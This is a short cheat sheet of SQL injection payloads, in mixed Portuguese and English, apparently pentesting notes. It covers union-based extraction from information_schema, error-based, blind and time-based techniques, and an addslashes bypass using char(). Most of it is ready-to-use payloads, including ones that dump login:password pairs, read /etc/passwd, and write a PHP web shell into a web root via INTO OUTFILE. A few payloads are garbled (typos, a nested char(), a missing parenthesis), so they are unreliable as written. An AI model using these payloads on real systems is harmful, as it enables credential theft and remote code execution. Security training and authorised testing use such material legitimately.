# SQL Injection
Injeção de SQL é uma vulnerabilidade de segurança comum em aplicações web que interagem com bancos de dados. Nesse tipo de ataque, um invasor insere intencionalmente instruções SQL maliciosas nos campos de entrada ou parâmetros de URL de um formulário web, explorando falhas na validação ou sanitização de dados. Quando essas instruções são executadas pelo banco de dados, elas podem permitir que o invasor manipule o comportamento do sistema, como acessar, modificar ou excluir dados, ou até mesmo obter controle total sobre o servidor

## Information Schema
Através do Information Schema é possível obter a tabela com usuários e senhas do sistema e obter as informações nela contidas

Exemplo: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23

Exemplo: ' union select 1,2,concat(login,':',senha),4,5 from table %23

## Error Based
Error Based, como o nome indica, baseia-se no erro que retorna ao tentar realizar uma consulta no banco de dados em algum campo. Com ele, você pode injetar código SQL para descobrir informações sobre a tabela e o banco de dados

Exemplo: ' union select 1,2,3... %23

Exemplo: ' order by 1 or 2 or 3...'

Exemplo: union select 1, column_name, load_file(”/etc/passwd”), 4, 5 from information_schema.columns where table_schema=”database” and table_name=”users” %23

## Blind
When there are no indications if there is a SQL Injection, some tests can be used to verify the AND and OR logic of the program.

Example: ' or 1=1 union select 1,2#

### Blind Post
To discover confidential information from the server through logic, it is possible to use the ascii function to find out the name of the database in which the application is located, so it is very common to use Burp Suite in Repeater mode to make requests.

Example: ' or length(database()) = 7 #

Example: ' or ascii(substring(database(),1,1)) = ascii number for letter # 

Example: ' or database() = char(115,116,114,105,110,103) # 

Example: ' or ascii(substring(select loing from column name limit 0,1),1,1)) = ascii number for letter #

## Time Based
Time Based uses the sleep() function to check if there is a SQL Injection vulnerability by observing if the page takes a long time to respond after sending a sleep() in a request to the database. If possible, you can use if to scan information about the database, tables, and other information as in other vulnerabilities

Example: ' or sleep(5)#

Example: ' or if (length(database()) = 5, sleep(5), 0)#

Example: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)#

Example: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#

## SQLi to RCE
Com a injeção de comando SQL, você pode gravar dados no servidor com o comando INTO OUTFILE e o caminho do diretório que deseja salvar

Exemplo: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/html/website/file.txt” %23

Exemplo: ‘ union all select 1,2,3,4, “`<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23

## Bypass addslashes
In some cases, because of the way it was programmed to be queried in the database, some backslashes will be added to the query, making it impossible to make queries with single quotes, generating an error. However, one of the ways to circumvent this mechanism is to pass string values in decimals separated by commas with the char() function.

Example: echo -n “string” | od -An -tdC

Example:-1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(115,116,114,105,110,103)

Site: [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)
